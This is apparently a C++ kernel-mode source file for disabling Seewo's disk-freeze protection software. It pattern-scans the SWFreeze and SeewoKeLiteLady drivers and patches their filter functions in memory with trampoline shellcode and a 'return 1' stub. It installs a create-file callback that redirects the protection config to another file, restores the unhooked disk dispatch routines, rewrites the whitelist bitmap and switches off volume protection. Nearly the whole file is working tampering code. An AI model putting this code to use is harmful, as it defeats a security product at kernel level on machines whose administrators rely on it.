#include "core.hpp"

BYTE ret1[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
BYTE mov_r9[] = { 0x49, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
BYTE jmp[] = { 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE0 };
WCHAR configFilePathNt[] = L"\\Device\\HarddiskVolume3\\ProgramData\\SeewoFreezeKernelConfig\\VolumeInfo.config";
WCHAR redirectFilePathNt[] = L"\\Device\\HarddiskVolume3\\ProgramData\\SeewoFreezeKernelConfig\\redirect.config";
WCHAR swfreezeDriverName[] = L"\\Driver\\SWFreeze";
WCHAR seewoKeLiteLadyDriverName[] = L"\\FileSystem\\SeewoKeLiteLady";

PDRIVER_OBJECT pSWFreezeDriverObject;
PDRIVER_OBJECT pDiskDriverObject;
PDRIVER_OBJECT pSeewoKeLiteLadyDriverObject;
ULONG64 PUnhookedReadFuncAddress = 0;
ULONG64 PUnhookedWriteFuncAddress = 0;
ULONG64 PUnhookedIoControlFuncAddress = 0;
ULONG64 HookedReadFunction = 0;
ULONG64 HookedWriteFunction = 0;
ULONG64 HookedIoControlFunction = 0;

// shellcode
__declspec(noinline) EXTERN_C FLT_PREOP_CALLBACK_STATUS PreCreateCallback(
	PFLT_CALLBACK_DATA Data,
	PFLT_RELATED_OBJECTS FltObjects,
	PVOID* CompletionContext,
	PFLT_CALLBACK_PARAMS params
)
{
	NTSTATUS status;
	PFLT_FILE_NAME_INFORMATION nameInfo;

	if (!params->isRedirect
		|| Data == NULL
		|| Data->Iopb == NULL
		|| Data->RequestorMode == KernelMode
		|| Data->Iopb->MajorFunction != 0x0) {
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	status = params->FltGetFileNameInformation(Data, 0x102, &nameInfo);
	if (!NT_SUCCESS(status)) {
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	params->FltParseFileNameInformation(nameInfo);
	if (nameInfo->Name.Length != sizeof(configFilePathNt) - sizeof(WCHAR)) {
		params->FltReleaseFileNameInformation(nameInfo);
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	for (ULONG i = 0; i < nameInfo->Name.Length / sizeof(WCHAR); i++) {
		if (nameInfo->Name.Buffer[i] != params->configPath[i]) {
			return FLT_PREOP_SUCCESS_NO_CALLBACK;
		}
	}
	params->FltReleaseFileNameInformation(nameInfo);

	ULONG createOptions = Data->Iopb->Options & 0x00FFFFFF;
	if (createOptions & FILE_SEQUENTIAL_ONLY) {
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	REPARSE_DATA_BUFFER* repBuffer = (REPARSE_DATA_BUFFER*)params->ExAllocatePool(0, sizeof(REPARSE_DATA_BUFFER) + sizeof(redirectFilePathNt));
	if (!repBuffer) {
		Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
		return FLT_PREOP_COMPLETE;
	}

	for (int i = 0; i < sizeof(REPARSE_DATA_BUFFER) + sizeof(redirectFilePathNt); i++) {
		((BYTE*)repBuffer)[i] = 0;
	}

	repBuffer->ReparseTag = IO_REPARSE_TAG_SYMLINK;
	// FIELD_OFFSET(SYMBOLIC_LINK_REPARSE_BUFFER, PathBuffer) -> 12
	repBuffer->ReparseDataLength = (USHORT)(12 + sizeof(redirectFilePathNt) - sizeof(WCHAR));
	repBuffer->Reserved = 0;
	repBuffer->SymbolicLinkReparseBuffer.SubstituteNameOffset = 0;
	repBuffer->SymbolicLinkReparseBuffer.SubstituteNameLength = (USHORT)(sizeof(redirectFilePathNt) - sizeof(WCHAR));
	repBuffer->SymbolicLinkReparseBuffer.PrintNameOffset = 0;
	repBuffer->SymbolicLinkReparseBuffer.PrintNameLength = 0;
	repBuffer->SymbolicLinkReparseBuffer.Flags = 0;

	for (int i = 0; i < sizeof(redirectFilePathNt) / sizeof(WCHAR); i++) {
		repBuffer->SymbolicLinkReparseBuffer.PathBuffer[i] = params->redirectPath[i];
	}

	Data->TagData = (PVOID)repBuffer;

	Data->IoStatus.Status = STATUS_REPARSE;
	Data->IoStatus.Information = IO_REPARSE_TAG_SYMLINK;

	return FLT_PREOP_COMPLETE;
}
__declspec(noinline) EXTERN_C int PreCreateCallbackEnd() {
	return 0;
}

BOOLEAN InstallCreateFileCallback(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	ULONG_PTR preCreateFuncStartAddr = (ULONG_PTR)PreCreateCallback;
	ULONG_PTR preCreateFuncEndAddr = (ULONG_PTR)PreCreateCallbackEnd;
	int preCreateFuncSize = preCreateFuncEndAddr - preCreateFuncStartAddr;

	InitFunction(krnl_base, get_kroutine);
	InitFunctionForFileFilter(krnl_base, get_kroutine);

	pSWFreezeDriverObject = GetDriverObjectByName(swfreezeDriverName);
	if (!pSWFreezeDriverObject) {
		R0Logger("[-] Failed to get SWFreeze driver object by name!\n");
		return FALSE;
	}
	pSeewoKeLiteLadyDriverObject = GetDriverObjectByName(seewoKeLiteLadyDriverName);
	if (!pSeewoKeLiteLadyDriverObject) {
		R0Logger("[-] Failed to get SeewoKeLiteLady driver object by name!\n");
		return FALSE;
	}

	DWORD64 seewoSetInfoFltFunctionAddress = ScanPattern(pSeewoKeLiteLadyDriverObject->DriverStart, pSeewoKeLiteLadyDriverObject->DriverSize, (BYTE*)"\x48\x8B\xF2\x48\x8B\xF9\x45\x33\xFF\x4C\x89", 11) - 0x30;
	if (!(seewoSetInfoFltFunctionAddress + 0x30) || !MmIsAddressValid((PVOID)seewoSetInfoFltFunctionAddress)) {
		R0Logger("[-] Failed to find SeewoKeLiteLady set information file filter function pattern address or address is invalid...\n");
		return FALSE;
	}
	R0Logger("[+] Found SeewoKeLiteLady set information file filter function pattern address -> %016llx\n", seewoSetInfoFltFunctionAddress);

	DWORD64 seewoCreateFltFunctionAddress = ScanPattern(pSeewoKeLiteLadyDriverObject->DriverStart, pSeewoKeLiteLadyDriverObject->DriverSize, (BYTE*)"\x4D\x8B\xF8\x48\x8B\xF2\x48\x8B\xF9\x45\x33\xED\x4C\x89", 14) - 0x2A;
	if (!(seewoCreateFltFunctionAddress + 0x2A) || !MmIsAddressValid((PVOID)seewoCreateFltFunctionAddress)) {
		R0Logger("[-] Failed to find SeewoKeLiteLady file filter function pattern address or address is invalid...\n");
		return FALSE;
	}
	R0Logger("[+] Found SeewoKeLiteLady file filter function pattern address -> %016llx\n", seewoCreateFltFunctionAddress);

	if (RtlCompareMemory((PVOID)seewoCreateFltFunctionAddress, mov_r9, 2) == 2) {
		PFLT_CALLBACK_PARAMS params = *(PFLT_CALLBACK_PARAMS*)(seewoCreateFltFunctionAddress + 2);

		if (((PFREEZE_CONFIG)config)->volumeProtected == -1) {
			params->isRedirect = FALSE;
			R0Logger("[+] SeewoKeLiteLady file filter function is disabled\n");
			return TRUE;
		}

		params->isRedirect = TRUE;
		R0Logger("[*] SeewoKeLiteLady create file filter function is already modified, skipping...\n");
		return TRUE;
	}
	else if (((PFREEZE_CONFIG)config)->volumeProtected == -1) {
		R0Logger("[-] File filter not installed...\n");
		return FALSE;
	}

	PFLT_CALLBACK_PARAMS params = (PFLT_CALLBACK_PARAMS)ExAllocatePool(0, sizeof(FLT_CALLBACK_PARAMS));
	params->FltGetFileNameInformation = FltGetFileNameInformation;
	params->FltParseFileNameInformation = FltParseFileNameInformation;
	params->FltReleaseFileNameInformation = FltReleaseFileNameInformation;
	params->RtlCompareUnicodeString = RtlCompareUnicodeString;
	params->RtlCopyUnicodeString = RtlCopyUnicodeString;
	params->ExAllocatePool = ExAllocatePool;
	params->ExFreePool = ExFreePool;
	params->isRedirect = TRUE;
	RtlCopyMemory(params->configPath, configFilePathNt, sizeof(configFilePathNt));
	RtlCopyMemory(params->redirectPath, redirectFilePathNt, sizeof(redirectFilePathNt));
	RtlCopyMemory(params->configPath, r0params->flt.volumeNtName, sizeof(configFilePathNt) - sizeof(WCHAR));
	RtlCopyMemory(params->redirectPath, r0params->flt.volumeNtName, sizeof(redirectFilePathNt) - sizeof(WCHAR));
	*(PFLT_CALLBACK_PARAMS*)(mov_r9 + 2) = params;

	PVOID prefunc = ExAllocatePool(0, preCreateFuncSize);
	if (!prefunc) {
		R0Logger("[-] Fail to allocate memory for shellcode!\n");
		return FALSE;
	}

	RtlCopyMemory(prefunc, (PVOID)preCreateFuncStartAddr, preCreateFuncSize);
	*(PVOID*)(jmp + 2) = prefunc;
	RtlCopyMemory(prefunc, (PVOID)preCreateFuncStartAddr, preCreateFuncSize);
	R0Logger("[+] Allocated shellcode for file filter function at -> 0x%p\n", prefunc);

	PMDL pMdl = NULL;
	PVOID writableAddress = InitRWmemForShellcode((PVOID)seewoCreateFltFunctionAddress, sizeof(mov_r9) + sizeof(jmp), &pMdl);
	if (!writableAddress) {
		R0Logger("[-] Failed to get writable address for file filter function!\n");
		return FALSE;
	}

	RtlCopyMemory(writableAddress, mov_r9, sizeof(mov_r9));
	writableAddress = (BYTE*)writableAddress + sizeof(mov_r9);
	RtlCopyMemory(writableAddress, jmp, sizeof(jmp));
	ReleaseRwmem(pMdl, writableAddress);
	R0Logger("[+] Successfully wrote to filter function!\n");

	pMdl = NULL;
	writableAddress = InitRWmemForShellcode((PVOID)seewoSetInfoFltFunctionAddress, sizeof(ret1), &pMdl);
	if (!writableAddress) {
		R0Logger("[-] Failed to get writable address for file filter function!\n");
		return FALSE;
	}

	RtlCopyMemory(writableAddress, ret1, sizeof(ret1));
	ReleaseRwmem(pMdl, writableAddress);
	R0Logger("[+] Successfully wrote to set information filter function!\n");

	return TRUE;
}

BOOLEAN SetMjFunc(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	DWORD64 Address = 0;
	WCHAR swfreezeDriverName[] = L"\\Driver\\SWFreeze";
	WCHAR diskDriverName[] = L"\\Driver\\Disk";

	InitFunction(krnl_base, get_kroutine);

	R0Logger("[*] Starting to recover major function...\n");

	pSWFreezeDriverObject = GetDriverObjectByName(swfreezeDriverName);
	if (!MmIsAddressValid(pSWFreezeDriverObject)) {
		R0Logger("[-] Failed to get SWFreeze driver object by name or driver object is invalid!\n");
		return FALSE;
	}

	pDiskDriverObject = GetDriverObjectByName(diskDriverName);
	if (!MmIsAddressValid(pDiskDriverObject)) {
		R0Logger("[-] Failed to get disk driver object by name or driver object is invalid!\n");
		return FALSE;
	}

	R0Logger("[*] SWFreeze driver object -> 0x%p\n", pSWFreezeDriverObject);
	R0Logger("[*] Disk driver object -> 0x%p\n", pDiskDriverObject);

	HookedReadFunction = (ULONG64)pDiskDriverObject->MajorFunction[3];
	HookedWriteFunction = (ULONG64)pDiskDriverObject->MajorFunction[4];
	HookedIoControlFunction = (ULONG64)pDiskDriverObject->MajorFunction[14];

	DriverBase = pSWFreezeDriverObject->DriverStart;
	DriverSize = pSWFreezeDriverObject->DriverSize;
	R0Logger("[*] SWFreeze driver base -> 0x%016llx, SWFreeze driver size -> 0x%016llx\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x48\x8B\xC1\x48\x87", 5);
	PUnhookedReadFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0xD) + 0x11 : 0;
	PUnhookedWriteFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0x26) + 0x2A : 0;
	PUnhookedIoControlFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0x3B) + 0x3F : 0;

	if (!PUnhookedReadFuncAddress or !MmIsAddressValid((PVOID)PUnhookedReadFuncAddress)) {
		R0Logger("[-] Failed to find unhooked read dispatch function pattern address or address is invalid...\n");
		return FALSE;
	}

	if (!PUnhookedWriteFuncAddress or !MmIsAddressValid((PVOID)PUnhookedWriteFuncAddress)) {
		R0Logger("[-] Failed to find unhooked write dispatch function pattern address or address is invalid...\n");
		return FALSE;
	}

	if (!PUnhookedIoControlFuncAddress or !MmIsAddressValid((PVOID)PUnhookedIoControlFuncAddress)) {
		R0Logger("[-] Failed to find unhooked io control dispatch function pattern address or address is invalid...\n");
		return FALSE;
	}

	R0Logger("[+] Found unhooked read dispatch function pattern address -> %016llx\n", PUnhookedReadFuncAddress);
	R0Logger("[+] Found unhooked write dispatch function pattern address -> %016llx\n", PUnhookedWriteFuncAddress);
	R0Logger("[+] Found unhooked io control dispatch function pattern address -> %016llx\n", PUnhookedIoControlFuncAddress);

	if (!r0params->mjFunc.recoverDiskMjFunc) {
		if (*(PVOID*)PUnhookedWriteFuncAddress) {
			pDiskDriverObject->MajorFunction[3] = *(PVOID*)PUnhookedReadFuncAddress;
			pDiskDriverObject->MajorFunction[4] = *(PVOID*)PUnhookedWriteFuncAddress;
			pDiskDriverObject->MajorFunction[14] = *(PVOID*)PUnhookedIoControlFuncAddress;
			R0Logger("[+] Successfully restored original dispatch functions for read/write/io control!\n");
		}
		else {
			R0Logger("[+] No recovery required.\n");
		}
	}
	else {
		if (*(PVOID*)PUnhookedWriteFuncAddress) {
			pDiskDriverObject->MajorFunction[3] = (PVOID)HookedReadFunction;
			pDiskDriverObject->MajorFunction[4] = (PVOID)HookedWriteFunction;
			pDiskDriverObject->MajorFunction[14] = (PVOID)HookedIoControlFunction;
			R0Logger("[+] Successfully restored SWFreeze dispatch functions for read/write/io control!\n");
		}
		else {
			R0Logger("[-] Failed to restore SWFreeze dispatch functions, you should enable volume protection first.\n");
		}
	}

	return TRUE;
}

BOOLEAN ModifyWhiteListByRanges(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	R0Logger("[*] Starting to modify white list bitmap...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		R0Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return FALSE;
	}
	R0Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);

	INT32 offset = *(INT32*)(Address - 0x4);
	PVOLUME_INFO_R0 pVolumeInfo = (PVOLUME_INFO_R0)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		R0Logger("[-] Invalid volume info table address.\n");
		return FALSE;
	}

	VOLUME_INFO_R0 volumeInfo = pVolumeInfo[r0params->whiteList.volumeIndex];
	if (!volumeInfo.isProtected2) {
		R0Logger("[-] Failed to modify white list, current volume is not protected.\n");
		return FALSE;
	}

	DWORD64* bmp = *(DWORD64**)(volumeInfo.pRWWhitelistBitmap->BlockTable);
	for (SIZE_T i = 0; i < r0params->whiteList.length; i++) {
		DWORD64 start = r0params->whiteList.ranges[i].start;
		DWORD64 length = r0params->whiteList.ranges[i].length;
		BmpSetRangeOfBits(bmp, start, length, r0params->whiteList.value);
	}

	R0Logger("[+] Successfully modified white list in memory!\n");
	return TRUE;
}

BOOLEAN ModifyWhiteListByBuffer(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	R0Logger("[*] Starting to modify white list bitmap...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		R0Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return FALSE;
	}
	R0Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);

	INT32 offset = *(INT32*)(Address - 0x4);
	PVOLUME_INFO_R0 pVolumeInfo = (PVOLUME_INFO_R0)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		R0Logger("[-] Invalid volume info table address.\n");
		return FALSE;
	}

	VOLUME_INFO_R0 volumeInfo = pVolumeInfo[r0params->whiteList.volumeIndex];
	if (!volumeInfo.isProtected2) {
		R0Logger("[-] Failed to modify white list, current volume is not protected.\n");
		return FALSE;
	}

	DWORD64 start = r0params->whiteList.startSector / 8;
	DWORD64 length = r0params->whiteList.sectorCount / 8;
	if (start + length > volumeInfo.volumeSectorCount || (LONGLONG)start < 0 || (LONGLONG)length < 0) {
		R0Logger("[-] Invalid sector offset.");
		return FALSE;
	}

	RtlCopyMemory(*(BYTE**)(volumeInfo.pRWWhitelistBitmap->BlockTable) + start, r0params->whiteList.buffer, length);

	R0Logger("[+] Successfully modified white list in memory!\n");
	return TRUE;
}

BOOLEAN GetWhiteListBitmap(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	R0Logger("[*] Starting to copy white list bitmap...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		R0Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return FALSE;
	}
	R0Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);

	INT32 offset = *(INT32*)(Address - 0x4);
	PVOLUME_INFO_R0 pVolumeInfo = (PVOLUME_INFO_R0)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		R0Logger("[-] Invalid volume info table address.\n");
		return FALSE;
	}

	VOLUME_INFO_R0 volumeInfo = pVolumeInfo[r0params->whiteList.volumeIndex];
	if (!volumeInfo.isProtected2) {
		R0Logger("[-] Failed to copy white list bitmap, current volume is not protected.\n");
		return FALSE;
	}

	DWORD64 start = r0params->whiteList.startSector / 8;
	DWORD64 length = r0params->whiteList.sectorCount / 8;
	if (start + length > volumeInfo.volumeSectorCount || (LONGLONG)start < 0 || (LONGLONG)length < 0) {
		R0Logger("[-] Invalid sector offset.");
		return FALSE;
	}

	RtlCopyMemory(r0params->whiteList.buffer, *(BYTE**)(volumeInfo.pRWWhitelistBitmap->BlockTable) + start, length);
	R0Logger("[+] Successfully copied white list bitmap to r3 buffer.\n");
}

BOOLEAN ModifyVolumeProtectionStatus(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	R0Logger("[*] Starting to modify volume protection status...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		R0Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return FALSE;
	}
	R0Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);
	INT32 offset = *(INT32*)(Address - 0x4);
	PVOLUME_INFO_R0 pVolumeInfo = (PVOLUME_INFO_R0)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		R0Logger("[-] Invalid volume info table address.\n");
		return FALSE;
	}

	for (int i = 0; i < 26; i++) {
		if (r0params->volumeProtection.volume & 1llu << i) {
			if (!r0params->volumeProtection.protection) {
				pVolumeInfo[i].isProtected = 0;
				R0Logger("[*] Successfully disabled drive %c protection.\n", pVolumeInfo[i].name);
			}
			else {
				if (pVolumeInfo[i].isProtected2 && pVolumeInfo[i].pDeviceObject) {
					pVolumeInfo[i].isProtected = 1;
					R0Logger("[*] Successfully enabled drive %c protection.\n", pVolumeInfo[i].name);
				}
				else {
					R0Logger("[-] Failed to disable drive %c protection.\n", pVolumeInfo[i].name);
				}
			}
		}
	}

	return TRUE;
}

BOOLEAN GetFreezeInfo(PVOID krnl_base, get_system_routine_t get_kroutine, PR0_PARAMS r0params) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		R0Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return FALSE;
	}
	R0Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);

	INT32 offset = *(INT32*)(Address - 0x4);
	PVOLUME_INFO_R0 pVolumeInfo = (PVOLUME_INFO_R0)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		R0Logger("[-] Invalid volume info table address.\n");
		return FALSE;
	}

	for (int i = 0; i < 26; i++) {
		PVOLUME_INFO_R3 pVolumeInfoR3 = volumeInfoTable[i];
		if (!pVolumeInfoR3) continue;

		VOLUME_INFO_R0 volumeInfoR0 = pVolumeInfo[i];
		if (!volumeInfoR0.isProtected && !volumeInfoR0.isProtected2) {
			pVolumeInfoR3->volumeProtectType = UNPROTECTED;
		}
		else if (volumeInfoR0.isProtected && volumeInfoR0.isProtected2) {
			pVolumeInfoR3->volumeProtectType = PROTECTED;
		}
		else if (!volumeInfoR0.isProtected && volumeInfoR0.isProtected2) {
			pVolumeInfoR3->volumeProtectType = BYPASS;
		}
		else {
			pVolumeInfoR3->volumeProtectType = UNKNOWN;
		}
		pVolumeInfoR3->physicalStartingOffset = volumeInfoR0.physicalStartingOffset;
		pVolumeInfoR3->volumeTotalBytes = volumeInfoR0.volumeTotalBytes;
		pVolumeInfoR3->volumeSectorCount = volumeInfoR0.volumeSectorCount;
	}

	pSeewoKeLiteLadyDriverObject = GetDriverObjectByName(seewoKeLiteLadyDriverName);
	if (pSeewoKeLiteLadyDriverObject) {
		DWORD64 seewoCreateFltFunctionAddress = ScanPattern(pSeewoKeLiteLadyDriverObject->DriverStart, pSeewoKeLiteLadyDriverObject->DriverSize, (BYTE*)"\x4D\x8B\xF8\x48\x8B\xF2\x48\x8B\xF9\x45\x33\xED\x4C\x89", 14) - 0x2A;
		if (!(seewoCreateFltFunctionAddress + 0x2A) || !MmIsAddressValid((PVOID)seewoCreateFltFunctionAddress)) {
			R0Logger("[-] Failed to find SeewoKeLiteLady file filter function pattern address or address is invalid...\n");
			return FALSE;
		}
		if (RtlCompareMemory((PVOID)seewoCreateFltFunctionAddress, mov_r9, 2) == 2) {
			PFLT_CALLBACK_PARAMS params = *(PFLT_CALLBACK_PARAMS*)(seewoCreateFltFunctionAddress + 2);
			if (params->isRedirect) filterInfo = INSTALLED;
			else filterInfo = DISABLED;
		}
		else filterInfo = NOT_INSTALLED;
	}

	return TRUE;
}